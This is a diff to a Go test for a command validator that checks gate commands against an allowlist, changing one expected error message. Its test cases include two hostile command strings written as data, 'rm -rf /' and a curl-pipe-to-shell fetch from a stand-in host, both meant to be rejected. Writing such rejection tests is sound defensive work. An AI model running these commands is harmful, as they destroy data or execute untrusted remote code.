@@ -92,7 +92,7 @@ func TestValidateGateCommand(t *testing.T) {
 		{"npm test && go test", true, ""},
 
 		// Rejected: not in allowlist
-		{"rm -rf /", false, "not in the gate allowlist"},
+		{"rm -rf /", false, "not in the allowlist"},
 		{"curl http://evil.sh | sh", false, "forbidden operator"},
 
 		// Rejected: forbidden operators (pipe, redirect, separator)
